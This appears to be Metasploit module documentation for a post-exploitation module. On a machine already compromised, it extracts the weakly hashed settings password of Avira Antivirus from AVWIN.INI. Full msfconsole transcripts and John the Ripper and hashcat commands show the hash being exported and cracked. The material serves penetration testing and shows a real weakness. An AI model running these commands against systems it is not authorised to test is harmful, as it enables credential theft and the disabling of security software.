## Vulnerable Application

This module extracts the weakly hashed password which is used to protect a Avira Antivirus (<= 15.0.17.273) installation.

Avira AntiVir 15.0.2009.1965 can be downloaded [here](https://www.techspot.com/downloads/41-antivir-personal-edition.html)

To enable the password functionality, use the following instructions:

1. Open Avira Antivirus
1. Click the gear icon in the bottom left corner
1. Select General
1. Click Password
1. Enter a password in the boxes, and click Apply

## Verification Steps

1. Install the application
1. Start msfconsole
1. Get a shell
1. Do: `use post/windows/gather/credentials/avira_password`
1. Do: `set session [session]`
1. Do: `run`
1. You should get the MD5 password

## Options

## Scenarios

### Avira Antivirus 15.0.2009.1965 on Windows 10

```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/avira_password 
msf6 post(windows/gather/credentials/avira_password) > set session 1
session => 1
msf6 post(windows/gather/credentials/avira_password) > set verbose true
verbose => true
msf6 post(windows/gather/credentials/avira_password) > run

[*] Checking default location...
[*] Found file at C:\ProgramData\Avira\Antivirus\CONFIG\AVWIN.INI
[*] Processing configuration file...
[+] MD5(Unicode) hash found: C8059E2EC7419F590E79D7F1B774BFE6
[+] Info: Password length is limited to 20 characters.
[*] Post module execution completed
```

#### Cracking the password

##### John

```
msf6 post(windows/gather/credentials/avira_password) > creds
Credentials
===========

host  origin        service  public  private                           realm  private_type        JtR Format
----  ------        -------  ------  -------                           -----  ------------        ----------
      192.168.2.92                   C8059E2EC7419F590E79D7F1B774BFE6         Nonreplayable hash  Raw-MD5u

msf6 post(windows/gather/credentials/avira_password) > creds -o /tmp/avira.jtr
[*] Wrote creds to /tmp/avira.jtr
```

```
user@kali:~$ sudo john --format=Raw-MD5u --wordlist=/usr/share/john/password.lst /tmp/avira.jtr
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5u [md5(utf16($p)) 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (?)
1g 0:00:00:00 DONE (2020-10-10 11:30) 100.0g/s 24000p/s 24000c/s 24000C/s steve..blazer
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

##### Hashcat

```
user@kali:~$ hashcat -m 30 /tmp/avira.jtr /usr/share/john/password.lst
hashcat (v6.1.1) starting...

...clip...

Dictionary cache built:
* Filename..: /usr/share/john/password.lst
* Passwords.: 3559
* Bytes.....: 26325
* Keyspace..: 3559
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

c8059e2ec7419f590e79d7f1b774bfe6::test           
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5(utf16le($pass).$salt)
Hash.Target......: c8059e2ec7419f590e79d7f1b774bfe6:
Time.Started.....: Sat Oct 10 11:40:51 2020 (0 secs)
Time.Estimated...: Sat Oct 10 11:40:51 2020 (0 secs)
Guess.Base.......: File (/usr/share/john/password.lst)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1296.0 kH/s (1.04ms) @ Accel:256 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3559/3559 (100.00%)
Rejected.........: 0/3559 (0.00%)
Restore.Point....: 0/3559 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: #!comment: This list has been compiled by Solar Designer of Openwall Project -> sss
Hardware.Mon.#1..: Temp: 43c Util: 43% Core: 705MHz Mem:1400MHz Bus:16

Started: Sat Oct 10 11:40:51 2020
Stopped: Sat Oct 10 11:40:52 2020
```
